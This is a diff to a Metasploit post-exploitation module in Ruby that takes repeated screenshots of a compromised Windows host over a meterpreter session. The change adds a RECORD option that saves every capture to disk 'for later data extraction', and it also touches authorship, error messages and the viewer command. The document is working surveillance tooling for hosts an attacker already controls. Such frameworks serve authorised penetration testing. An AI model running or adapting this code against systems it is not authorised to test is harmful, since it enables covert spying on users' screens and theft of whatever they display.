@@ -19,13 +19,15 @@ class Metasploit3 < Msf::Post
 			'Description'    => %q{ 
 					This module will incrementally take screenshots of the meterpreter host. This
 				allows for screen spying which can be useful to determine if there is an active
-				user on a machine.
+				user on a machine, or to record the screen for later data extraction.
 				},
 			'License'        => MSF_LICENSE,
 			'Author'         =>
 				[
 					'Roni Bachar <roni.bachar.blog[at]gmail.com>', # original meterpreter script
-					'bannedit' # post module
+					'bannedit', # post module
+					'kernelsmith <kernelsmith /x40 kernelsmith /x2E com>', # record support
+					'Adrian Kubok' # better record file names
 				],
 			'Version'        => '$Revision$',
 			'Platform'       => ['windows'],
@@ -37,6 +39,7 @@ class Metasploit3 < Msf::Post
 				OptInt.new('DELAY', [false, 'Interval between screenshots in seconds', 5]),
 				OptInt.new('COUNT', [false, 'Number of screenshots to collect', 60]),
 				OptString.new('BROWSER', [false, 'Browser to use for viewing screenshots', 'firefox']),
+				OptBool.new('RECORD', [false, 'Record all screenshots to disk',false])
 			], self.class)
 	end
 
@@ -53,7 +56,7 @@ class Metasploit3 < Msf::Post
 		begin
 			session.core.use("espia")
 		rescue ::Exception => e
-			print_error("Failed to load espia extension")
+			print_error("Failed to load espia extension (#{e.to_s})")
 			return
 		end
 
@@ -63,7 +66,7 @@ class Metasploit3 < Msf::Post
 		when /ming/
 			cmd = "start #{datastore['BROWSER']} \"file://#{screenshot}\""
 		when /linux/
-			cmd = "bash #{datastore['BROWSER']} file://#{screenshot}"
+			cmd = "#{datastore['BROWSER']} file://#{screenshot}"
 		when /apple/
 			cmd = "open file://#{screenshot}" # this will use preview
 		end
@@ -71,10 +74,20 @@ class Metasploit3 < Msf::Post
 		begin
 			count = datastore['COUNT']
 			print_status "Capturing %u screenshots with a delay of %u seconds" % [count, datastore['DELAY']]
-			count.times do
+			# calculate a sane number of leading zeros to use.  log of x  is ~ the number of digits
+			leading_zeros = Math::log(count,10).round
+			count.times do |num|
 				select(nil, nil, nil, datastore['DELAY'])
 				data = session.espia.espia_image_get_dev_screen
 				if data
+					if datastore['RECORD']
+						# let's write it to disk using non-clobbering filename
+						shot = Msf::Config.install_root + "/data/" + host + ".screenshot.%0#{leading_zeros}d.jpg" % num
+						ss = ::File.new(shot, 'wb')
+						ss.write(data)
+						ss.close
+					end
+
 					fd = ::File.new(screenshot, 'wb')
 					fd.write(data)
 					fd.close
